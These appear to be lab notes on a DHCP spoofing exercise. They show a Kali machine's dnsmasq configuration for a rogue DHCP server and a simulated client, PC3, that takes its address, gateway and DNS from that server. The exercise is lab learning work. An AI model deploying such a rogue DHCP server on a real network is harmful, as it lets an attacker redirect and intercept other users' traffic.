


DHCP
A. DHCP spoofing
┌──(kali㉿kali)-[~]
└─$ cat /etc/dnsmasq.conf 
server=1.1.1.1
listen-address=127.0.0.1
listen-address=10.2.1.187
no-dhcp-interface=
no-hosts
dhcp-range=10.2.1.220,10.2.1.230,12h
dhcp-option=option:netmask,255.255.255.0
dhcp-option=option:router,10.2.1.254
dhcp-option=option:dns-server,10.2.1.12
# addn-hosts=/etc/dnsmasq.d/spoof.hosts

┌──(kali㉿kali)-[~]
└─$ 


Only Atk VM up - Legit DHCP Server Down

PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 0.0.0.0/0
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:05
LPORT       : 20044
RHOST:PORT  : 127.0.0.1:20045
MTU         : 1500

PC3> ip dhcp
DDORA IP 10.2.1.230/24 GW 10.2.1.254

PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 10.2.1.230/24
GATEWAY     : 10.2.1.254
DNS         : 10.2.1.12
DHCP SERVER : 10.2.1.60
DHCP LEASE  : 43194, 43200/21600/37800
MAC         : 00:50:79:66:68:05
LPORT       : 20044
RHOST:PORT  : 127.0.0.1:20045
MTU         : 1500

PC3>


Legit DHCP + Atk VM up - DHCP Spoofing

Capture : [dhcp_spoof.pcapng](dhcp_spoof.pcapng)

PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 0.0.0.0/0
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:05
LPORT       : 20044
RHOST:PORT  : 127.0.0.1:20045
MTU         : 1500

PC3> ip dhcp
DORA IP 10.2.1.230/24 GW 10.2.1.254

PC3> sh ip

NAME        : PC3[1]
IP/MASK     : 10.2.1.230/24
GATEWAY     : 10.2.1.254
DNS         : 10.2.1.12
DHCP SERVER : 10.2.1.60
DHCP LEASE  : 40418, 43200/21600/37800
MAC         : 00:50:79:66:68:05
LPORT       : 20044
RHOST:PORT  : 127.0.0.1:20045
MTU         : 1500
